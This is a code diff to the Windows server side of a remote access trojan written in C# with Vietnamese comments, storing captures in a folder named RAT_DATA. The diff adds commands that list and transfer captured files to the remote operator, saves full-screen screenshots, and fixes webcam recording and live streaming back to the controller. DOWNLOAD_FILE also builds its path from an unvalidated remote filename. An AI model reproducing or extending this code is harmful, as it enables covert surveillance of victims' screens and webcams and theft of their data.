@@ -33,13 +33,18 @@ namespace ServerApp
         bool isRecording = false;
         Socket videoClient;       // Socket gửi ảnh
         string currentVideoFile = "";
+        string dataFolder = @"C:\RAT_DATA";
         // ---------------------------------------
         public server()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
             this.FormClosing += new FormClosingEventHandler(server_FormClosing);
-
+            // Tạo thư mục lưu dữ liệu nếu chưa có
+            if (!Directory.Exists(dataFolder))
+            {
+                Directory.CreateDirectory(dataFolder);
+            }
             // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
             try
             {
@@ -153,12 +158,78 @@ namespace ServerApp
                         break;
 
                     case "WEBCAM_RECORD_OFF":
+                        // 1. Ngắt cờ ghi hình trước
                         isRecording = false;
-                        if (writer != null && writer.IsOpen) writer.Close();
-                        Program.nw.WriteLine("Recording Saved"); // Phản hồi
-                        Program.nw.Flush();
+
+                        // 2. QUAN TRỌNG: Tạm dừng 100ms để luồng Camera (video_NewFrame) kịp nhả file ra
+                        // Nếu không có dòng này, lệnh Close() bên dưới sẽ đụng độ với lệnh Write() đang chạy dở -> Sập
+                        Thread.Sleep(100);
+
+                        // 3. Đóng và Hủy biến writer an toàn
+                        if (writer != null)
+                        {
+                            try
+                            {
+                                // Dù writer đang mở hay đóng cũng cố gắng Dispose sạch sẽ
+                                writer.Close();
+                                writer.Dispose();
+                            }
+                            catch { }
+
+                            // 4. BẮT BUỘC: Gán về null để hàm StartRecording lần sau biết đường tạo mới
+                            // Nếu thiếu dòng này, lần quay sau sẽ báo lỗi "Cannot access a disposed object"
+                            writer = null;
+                        }
+
+                        Program.nw.WriteLine("Recording Saved");
+                        Program.nw.Flush(); // Đảm bảo gửi tin nhắn về Python ngay
                         break;
 
+                    case "GET_FILES":
+                        try
+                        {
+                            // Lấy danh sách file trong C:\RAT_DATA
+                            string[] files = Directory.GetFiles(dataFolder);
+
+                            // Gửi số lượng file trước
+                            Program.nw.WriteLine(files.Length.ToString());
+                            Program.nw.Flush();
+
+                            // Gửi tên và kích thước từng file
+                            foreach (string filePath in files)
+                            {
+                                FileInfo fi = new FileInfo(filePath);
+                                Program.nw.WriteLine(Path.GetFileName(filePath));
+                                Program.nw.Flush();
+                                Program.nw.WriteLine(fi.Length.ToString());
+                                Program.nw.Flush();
+                            }
+                        }
+                        catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
+                        break;
+
+                    case "DOWNLOAD_FILE":
+                        try
+                        {
+                            // Nhận tên file cần tải
+                            string fileName = Program.nr.ReadLine();
+                            string fullPath = Path.Combine(dataFolder, fileName);
+
+                            if (File.Exists(fullPath))
+                            {
+                                FileInfo fi = new FileInfo(fullPath);
+                                Program.nw.WriteLine(fi.Length.ToString()); // Gửi kích thước
+                                Program.nw.Flush();
+                                Program.client.SendFile(fullPath);          // Gửi dữ liệu
+                            }
+                            else
+                            {
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                        }
+                        catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
+                        break;
                     // --- THOÁT ---
                     case "QUIT": return;
 
@@ -251,18 +322,26 @@ namespace ServerApp
                 {
                     try
                     {
-                        // Chụp toàn màn hình
+                        // 1. Chụp màn hình
                         Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                         Graphics g = Graphics.FromImage(bmp);
                         g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
 
-                        // Lưu vào MemoryStream để chuyển thành mảng byte
+                        // 2. LƯU FILE VÀO C:\RAT_DATA (THÊM MỚI)
+                        try
+                        {
+                            string photoName = "Screen_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png";
+                            string savePath = Path.Combine(dataFolder, photoName);
+                            bmp.Save(savePath, ImageFormat.Png);
+                        }
+                        catch { /* Bỏ qua lỗi lưu file nếu ổ cứng đầy/lỗi quyền */ }
+
+                        // 3. Gửi qua mạng về Client (Giữ nguyên logic cũ để hiện lên Web)
                         MemoryStream ms = new MemoryStream();
                         bmp.Save(ms, ImageFormat.Bmp);
                         byte[] b = ms.ToArray();
-
-                        // Gửi kích thước ảnh trước, sau đó gửi dữ liệu ảnh
-                        Program.nw.WriteLine(b.Length.ToString()); Program.nw.Flush();
+                        Program.nw.WriteLine(b.Length.ToString());
+                        Program.nw.Flush();
                         Program.client.Send(b);
                     }
                     catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
@@ -404,10 +483,17 @@ namespace ServerApp
                 videoSource.SignalToStop();
                 videoSource = null;
             }
-            if (writer != null && writer.IsOpen)
+
+            // Sửa đoạn này để dọn dẹp sạch sẽ writer
+            if (writer != null)
             {
-                writer.Close();
-                writer.Dispose();
+                try
+                {
+                    writer.Close();
+                    writer.Dispose();
+                }
+                catch { }
+                writer = null; // <--- QUAN TRỌNG
             }
         }
 
@@ -416,23 +502,20 @@ namespace ServerApp
         {
             try
             {
-                // 1. Tạo tên file mới dựa trên giờ hiện tại
-                currentVideoFile = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";
+                // 1. Tạo tên file .mp4 và ghép với đường dẫn C:\RAT_DATA
+                string fileName = "Record_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".avi";
+                currentVideoFile = Path.Combine(dataFolder, fileName);
 
-                // 2. Đảm bảo writer cũ đã đóng trước khi bắt đầu cái mới
+                // 2. QUAN TRỌNG: Reset writer cũ nếu có để tránh lỗi ObjectDisposed
                 if (writer != null)
                 {
                     writer.Dispose();
                     writer = null;
                 }
 
-                // 3. Chỉ bật cờ hiệu, chưa mở file ngay (để dành việc mở file cho hàm video_NewFrame)
                 isRecording = true;
             }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Lỗi bật ghi hình: " + ex.Message);
-            }
+            catch (Exception ex) { MessageBox.Show("Lỗi bật ghi hình: " + ex.Message); }
         }
 
         // 5. Sự kiện xử lý từng khung hình (Quan trọng)
@@ -440,58 +523,66 @@ namespace ServerApp
         {
             try
             {
-                // Clone ảnh từ Camera ra để xử lý
+                // Clone ảnh để xử lý
                 Bitmap image = (Bitmap)eventArgs.Frame.Clone();
 
-                // --- PHẦN 1: XỬ LÝ GHI HÌNH (RECORD) ---
+                // 1. GHI HÌNH (RECORD)
                 if (isRecording)
                 {
-                    // Kiểm tra: Nếu file chưa mở thì mở ngay bây giờ
-                    // Lúc này ta dùng chính kích thước của 'image' để mở file
-                    if (writer == null)
+                    try
                     {
-                        writer = new VideoFileWriter();
+                        // Nếu writer chưa mở -> Mở mới
+                        if (writer == null)
+                        {
+                            writer = new VideoFileWriter();
+                            
+                            // --- XỬ LÝ KÍCH THƯỚC LẺ (QUAN TRỌNG) ---
+                            // FFmpeg sẽ sập ngay lập tức nếu chiều rộng/cao là số lẻ
+                            int w = image.Width;
+                            int h = image.Height;
+                            if (w % 2 != 0) w--; // Giảm 1 pixel nếu lẻ
+                            if (h % 2 != 0) h--;
+                            
+                            // Mở file AVI với kích thước CHẴN và Codec MPEG4
+                            // Bitrate 1500000 (1.5 Mbps) là đủ đẹp và nhẹ
+                            writer.Open(currentVideoFile, w, h, 25, VideoCodec.MPEG4, 1500000);
+                        }
 
-                        // QUAN TRỌNG: image.Width và image.Height là kích thước thật của Camera
-                        // Bitrate 2000000 (2Mbps) giúp video nét hơn
-                        writer.Open(currentVideoFile, image.Width, image.Height, 25, VideoCodec.MPEG4, 2000000);
+                        // Ghi hình (Chỉ ghi khi writer đã mở thành công)
+                        if (writer.IsOpen)
+                        {
+                            // Lưu ý: Nếu ảnh gốc là lẻ, Accord thường tự crop nhẹ để vừa với kích thước chẵn đã Open
+                            // Nên ta cứ truyền nguyên ảnh gốc vào
+                            writer.WriteVideoFrame(image);
+                        }
                     }
-
-                    // Nếu file đang mở thì ghi hình vào
-                    if (writer.IsOpen)
+                    catch (Exception)
                     {
-                        writer.WriteVideoFrame(image);
+                        // Nếu lỗi ghi frame -> Tắt ghi hình luôn để tránh crash ứng dụng
+                        isRecording = false;
+                        if (writer != null) { try { writer.Dispose(); } catch {} writer = null; }
                     }
                 }
 
-                // --- PHẦN 2: XỬ LÝ TRUYỀN HÌNH (STREAMING) ---
-                // (Đoạn này giữ nguyên logic cũ để truyền qua mạng)
+                // 2. STREAMING (Giữ nguyên)
                 if (isStreaming && videoClient != null && videoClient.Connected)
                 {
                     using (MemoryStream ms = new MemoryStream())
                     {
-                        // Nén ảnh JPEG chất lượng 50%
                         EncoderParameters myEncoderParameters = new EncoderParameters(1);
                         myEncoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 50L);
-
                         image.Save(ms, GetEncoderInfo("image/jpeg"), myEncoderParameters);
-
+                        
                         byte[] buffer = ms.ToArray();
                         byte[] sizeInfo = Encoding.ASCII.GetBytes(buffer.Length.ToString() + "\n");
-
-                        // Gửi kích thước -> Gửi ảnh
                         videoClient.Send(sizeInfo);
                         videoClient.Send(buffer);
                     }
                 }
-
-                // Giải phóng bộ nhớ ảnh
+                
                 image.Dispose();
             }
-            catch
-            {
-                // Bỏ qua lỗi nếu bị drop frame để tránh crash
-            }
+            catch { }
         }
 
         // 6. Hàm phụ trợ nén ảnh
